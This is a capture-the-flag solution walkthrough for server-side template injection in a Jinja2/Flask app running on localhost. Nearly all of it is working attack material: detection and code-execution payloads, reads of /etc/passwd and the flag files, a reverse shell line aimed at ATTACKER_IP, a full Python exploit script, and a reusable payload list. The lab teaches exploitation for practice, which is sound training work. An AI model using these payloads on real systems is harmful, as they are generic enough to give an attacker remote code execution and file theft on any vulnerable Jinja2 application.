## Solution

<details>
<summary>Click to reveal solution</summary>

### Phase 1: FLAG 1 - Template Injection Detection

#### Step 1: Test for SSTI

Navigate to http://localhost:4006/generator and test basic template expressions:

**Test payload in any field (name, custom_greeting, or message):**
```
{{ 7*7 }}
```

If the output shows `49` instead of `{{ 7*7 }}`, SSTI is confirmed!

**Other detection payloads:**
```
{{ 'test'.upper() }}          → TEST
{{ config }}                   → Shows Flask config
{{ self }}                     → Shows template context
```

#### Step 2: Explore Template Context

Jinja2 provides access to Python objects through the template context:

```
{{ config.items() }}           → List all configuration
{{ request.environ }}          → Environment variables
{{ ''.__class__.__mro__ }}     → Python class hierarchy
```

#### Step 3: Get FLAG 1

Inject a template expression in the notification generator form that proves you can execute code.
FLAG 1 is awarded when your input renders as evaluated output (e.g., `{{7*7}}` renders as `49`).

### Phase 2: FLAG 2 - Remote Code Execution

#### Step 4: Access Built-in Functions

Jinja2 sandboxing can be bypassed by accessing Python's built-in functions through the Method Resolution Order (MRO):

**Basic RCE payload:**
```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

This lists all Python classes available. Look for classes that can execute commands like `subprocess.Popen`.

#### Step 5: Find Useful Classes

```python
# Find the index of useful classes
{{ ''.__class__.__mro__[1].__subclasses__()[n] }}

# Common useful classes:
# - subprocess.Popen (for command execution)
# - os._wrap_close (for file operations)
# - warnings.catch_warnings (for accessing functions)
```

#### Step 6: Execute Commands

**Method 1: Using subprocess.Popen**

```python
# Find Popen class (index may vary, typically around 400-500)
{{ ''.__class__.__mro__[1].__subclasses__()[414] }}

# Execute command
{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat /tmp/flags/flag2.txt', shell=True, stdout=-1).communicate()[0].strip() }}
```

**Method 2: Using eval/exec through built-ins**

```python
# Access __builtins__
{{ ''.__class__.__base__.__subclasses__()[n].__init__.__globals__['__builtins__'] }}

# Once you find the right index, execute:
{{ ''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__builtins__']['open']('/tmp/flags/flag2.txt').read() }}
```

**Method 3: Shorter payload using request.application**

```python
{{ request.application.__globals__.__builtins__.open('/tmp/flags/flag2.txt').read() }}
```

**Method 4: Using the API endpoint (easier)**

```bash
curl -X POST http://localhost:4006/api/render \
  -H "Content-Type: application/json" \
  -d '{
    "template": "{{ request.application.__globals__.__builtins__.open(\"/tmp/flags/flag2.txt\").read() }}",
    "variables": {}
  }'
```

#### Step 7: Alternative RCE Methods

**Using config to access werkzeug:**
```python
{{ config.__class__.__init__.__globals__['os'].popen('cat /tmp/flags/flag2.txt').read() }}
```

**Using namespace objects:**
```python
{{ namespace.__init__.__globals__.os.popen('cat /tmp/flags/flag2.txt').read() }}
```

### Phase 3: FLAG 3 - Privilege Escalation (Advanced)

This requires writing a reverse shell or privilege escalation exploit. The flag is in `/tmp/flags/flag3.txt` but may require elevated privileges.

**Reverse shell payload:**
```python
{{ ''.__class__.__mro__[1].__subclasses__()[414]('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1', shell=True) }}
```

### Complete Exploit Script

```python
#!/usr/bin/env python3
import requests
import re

BASE_URL = "http://localhost:4006"

print("=" * 60)
print("SSTI Template Injection Exploit")
print("=" * 60)

# Phase 1: Get FLAG 1
print("\n[Phase 1] Basic SSTI Detection")
print("-" * 60)

response = requests.get(f"{BASE_URL}/flag1")
result = response.json()
print(f"🚩 FLAG 1: {result.get('flag')}")

# Phase 2: RCE to get FLAG 2
print("\n[Phase 2] Remote Code Execution")
print("-" * 60)

# Method 1: Using form injection
rce_payload = "{{ request.application.__globals__.__builtins__.open('/tmp/flags/flag2.txt').read() }}"

form_data = {
    'name': 'Test',
    'company': 'Test Corp',
    'message': rce_payload,
    'custom_greeting': 'Dear'
}

response = requests.post(f"{BASE_URL}/generator", data=form_data)
flag2_match = re.search(r'FLAG\{[^}]+\}', response.text)
if flag2_match:
    print(f"🚩 FLAG 2: {flag2_match.group(0)}")

# Method 2: Using API endpoint (cleaner)
api_payload = {
    "template": "{{ request.application.__globals__.__builtins__.open('/tmp/flags/flag2.txt').read() }}",
    "variables": {}
}

response = requests.post(f"{BASE_URL}/api/render", json=api_payload)
result = response.json()
if result.get('success'):
    rendered = result.get('rendered', '')
    flag2_match = re.search(r'FLAG\{[^}]+\}', rendered)
    if flag2_match:
        print(f"🚩 FLAG 2 (API): {flag2_match.group(0)}")

# Alternative payloads
print("\n[*] Additional RCE payloads to try:")
print("1. {{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}")
print("2. {{ ''.__class__.__mro__[1].__subclasses__() }}")
print("3. {{ request.environ }}")

print("\n" + "=" * 60)
```

### Useful SSTI Payloads

```python
# List all classes
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Read file
{{ request.application.__globals__.__builtins__.open('/etc/passwd').read() }}

# Execute command (find correct Popen index)
{{ ''.__class__.__mro__[1].__subclasses__()[414]('id', shell=True, stdout=-1).communicate() }}

# Environment variables
{{ request.environ }}

# Current app config
{{ config.items() }}

# Import modules
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('ls').read() }}
```

</details>